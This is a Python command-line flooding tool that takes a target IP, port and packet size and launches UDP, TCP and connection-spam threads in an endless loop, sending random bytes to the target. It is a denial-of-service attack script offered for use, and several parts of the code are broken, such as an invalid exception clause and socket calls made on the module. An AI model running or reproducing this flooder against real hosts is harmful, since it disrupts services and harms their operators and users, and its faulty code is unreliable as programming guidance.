#!usr/bin/python
# _*_ coding: utf-8 _*_
import os
import socket
import sys
import time
import threading
import random
 
# Color
class bcolors:
    ZA = '\033[97m'
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    ZA1 = '\033[31m'
    ZA2 = '\033[32m'
    ZA3 = '\033[33m'
    FAIL = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    

# Clear termunal screen
os.system('clear')


# Function to diplay header
def display_header():
    header_lines = (" ")
print("\033[33m       ⁶ ⁶       ⁶ ⁵  ⁷ ⁶ ⁶ ⁶ ⁵               \033[0m")
print("\033[33m       ⁶  ⁶     ⁵  ⁵  ⁵         ⁵      \033[0m")
print("\033[33m       ⁶   ⁶   ⁵   ⁵  ⁵         ⁵         \033[0m")
print("\033[33m       ⁶    ⁶ ⁵    ⁵  ⁵         ⁵       \033[0m")
print("\033[92m       ⁶     ⁶     ⁵  ⁵ ⁵ ⁴ ⁵ ⁵             \033[0m")
print("\033[92m       ⁸           ⁵  ⁵      ⁴          \033[0m")
print("\033[92m       ⁸           ⁵  ⁵       ⁵        \033[0m")
print("\033[92m       ⁹           ⁵  ⁵        ⁵             \033[0m")
    

if len(sys.argv) < 4:
   print("")
   sys.exit("Usage: python "+sys.argv[0]+" <ip> <port> <size>")

ip = sys.argv[1]
port = int(sys.argv[2])
size = int(sys.argv[3])
packets = int(sys.argv[3])

class syn(threading.Thread):
    def __init__(self, ip, port, packets):
        self.ip = ip
        self.port = port
        self.packets = packets
        self.syn = socket.socket()
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.packets):
            try:
                self.syn.connect((self.ip, self.port))
            except:
                pass

class tcp(threading.Thread):
    def __init__(self, ip, port, size, packets):
        self.ip = ip
        self.port = port
        self.size = size
        self.packets = packets
        self.tcp = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.packets):
            try:
                bytes = random._urandom(self.size)
                socket.connect(self.ip, self.port)
                socket.setblocking(0)
                socket.sendto(bytes,(self.ip, self.port))
            except:
                pass

class udp(threading.Thread):
    def __init__(self, ip, port, size, packets):
        self.ip = ip
        self.port = port
        self.size = size
        self.packets = packets
        self.udp = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.packets):
            try:
                bytes = random._urandom(self.size)
                if self.port == 0:
                    self.port = random.randrange(1, 65535)
                self.udp.sendto(bytes,(self.ip, self.port))
            except:
                pass

while True:
    try:
        if size > 65507:
            sys.exit("Invalid Number Of Packets!")
        u = udp(ip,port,size,packets)
        t = tcp(ip,port,size,packets)
        s = syn(ip,port,packets)
        u.start()
        t.start()
        s.start()
    except KeyboardInterrupt:
        print ("Stopping Flood!")
        sys.exit()
    except 'socket.error' (msg):
        print ("Socket Couldn't Connect")
        sys.exit()
